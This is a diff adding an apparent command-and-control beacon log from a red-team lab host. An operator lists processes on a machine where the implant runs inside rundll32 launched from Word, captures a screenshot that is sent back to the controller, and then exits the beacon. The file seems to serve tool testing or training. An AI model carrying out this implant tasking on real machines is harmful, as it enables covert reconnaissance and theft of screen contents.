@@ -1,0 +1,95 @@
+03/29 14:54:56 UTC [metadata] 13.80.254.1 <- 10.99.1.4; computer: LabMaster; user: outflank *; process: rundll32.exe; pid: 3568; os: Windows; version: 10.0; beacon arch: x86 (x64)
+03/29 15:00:18 UTC [input] <MarcS> ps
+03/29 15:00:18 UTC [task] <T1057> Tasked beacon to list processes
+03/29 15:00:22 UTC [checkin] host called home, sent: 12 bytes
+03/29 15:00:22 UTC [output]
+[System Process]	0	0
+System	0	4	x64		0
+smss.exe	4	304	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	416	428
+wininit.exe	416	492	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	484	500
+winlogon.exe	484	552	x64	NT AUTHORITY\SYSTEM	1
+services.exe	492	620	x64	NT AUTHORITY\SYSTEM	0
+lsass.exe	492	628	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	720	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	764	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	620	876	x64	NT AUTHORITY\SYSTEM	0
+dwm.exe	552	908
+svchost.exe	620	956	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	620	1008	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	1408	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	620	1416	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	620	1560	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	620	1700	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	1840	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	2016	x64	NT AUTHORITY\LOCAL SERVICE	0
+VSSVC.exe	620	2024	x64	NT AUTHORITY\SYSTEM	0
+spoolsv.exe	620	1168	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	1360	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	1960	x64	NT AUTHORITY\SYSTEM	0
+MsMpEng.exe	620	1988	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	2436	x64	NT AUTHORITY\NETWORK SERVICE	0
+WaAppAgent.exe	620	3244	x64	NT AUTHORITY\SYSTEM	0
+LogonUI.exe	552	3412	x64	NT AUTHORITY\SYSTEM	1
+rundll32.exe	876	3656	x64	NT AUTHORITY\SYSTEM	0
+rundll32.exe	876	3772	x64	NT AUTHORITY\SYSTEM	0
+WindowsAzureTelemetryService.exe	620	3980	x64	NT AUTHORITY\SYSTEM	0
+WindowsAzureGuestAgent.exe	620	2384	x64	NT AUTHORITY\SYSTEM	0
+WaSecAgentProv.exe	3244	688	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	688	3900	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	620	1504	x64	NT AUTHORITY\NETWORK SERVICE	0
+msdtc.exe	620	2236	x64	NT AUTHORITY\NETWORK SERVICE	0
+WindowsAzureNetAgent.exe	620	3896	x64	NT AUTHORITY\SYSTEM	0
+VFPlugin.exe	3896	2932	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	2932	3576	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	440	1312
+winlogon.exe	440	2980	x64	NT AUTHORITY\SYSTEM	2
+dwm.exe	2980	1288
+rdpclip.exe	2436	2920	x64	LabMaster\outflank	2
+RuntimeBroker.exe	720	808	x64	LabMaster\outflank	2
+sihost.exe	876	2368	x64	LabMaster\outflank	2
+explorer.exe	2136	3636	x64	LabMaster\outflank	2
+svchost.exe	620	2632	x64	LabMaster\outflank	2
+taskhostw.exe	876	3368	x64	LabMaster\outflank	2
+ShellExperienceHost.exe	720	4664	x64	LabMaster\outflank	2
+SearchUI.exe	720	4760	x64	LabMaster\outflank	2
+powershell.exe	808	3084	x64	LabMaster\outflank	2
+conhost.exe	3084	4844	x64	LabMaster\outflank	2
+svchost.exe	620	3812	x64	NT AUTHORITY\LOCAL SERVICE	0
+taskhostw.exe	876	5548	x64	LabMaster\outflank	2
+OfficeClickToRun.exe	620	4216	x64	NT AUTHORITY\SYSTEM	0
+fontdrvhost.exe	2980	4908
+AppVShNotify.exe	4216	2172	x64	LabMaster\outflank	2
+mstsc.exe	3636	2196	x64	LabMaster\outflank	2
+mstsc.exe	3636	4900	x64	LabMaster\outflank	2
+javaw.exe	3272	3832	x64	LabMaster\outflank	2
+testbeacon.exe	3636	3324	x64	LabMaster\outflank	2
+testbeacon-longhaul.exe	3636	5792	x64	LabMaster\outflank	2
+notepad.exe	3636	4804	x64	LabMaster\outflank	2
+chrome.exe	808	1060	x64	LabMaster\outflank	2
+chrome.exe	1060	2888	x64	LabMaster\outflank	2
+chrome.exe	1060	4640	x64	LabMaster\outflank	2
+chrome.exe	1060	4240	x64	LabMaster\outflank	2
+chrome.exe	1060	5788	x64	LabMaster\outflank	2
+chrome.exe	1060	4052	x64	LabMaster\outflank	2
+WmiPrvSE.exe	720	5300
+chrome.exe	1060	5380	x64	LabMaster\outflank	2
+chrome.exe	1060	2508	x64	LabMaster\outflank	2
+WINWORD.EXE	5648	5096	x86	LabMaster\outflank	2
+rundll32.exe	5096	3568	x86	LabMaster\outflank	2
+WmiPrvSE.exe	720	2868
+
+
+03/29 15:00:35 UTC [input] <MarcS> screenshot
+03/29 15:00:35 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/29 15:00:36 UTC [checkin] host called home, sent: 162370 bytes
+03/29 15:00:37 UTC [output]
+received screenshot (253367 bytes)
+
+03/29 15:01:00 UTC [input] <MarcS> exit
+03/29 15:01:00 UTC [task] <> Tasked beacon to exit
+03/29 15:01:01 UTC [checkin] host called home, sent: 8 bytes
+03/29 15:01:01 UTC [output]
+beacon exit.
+
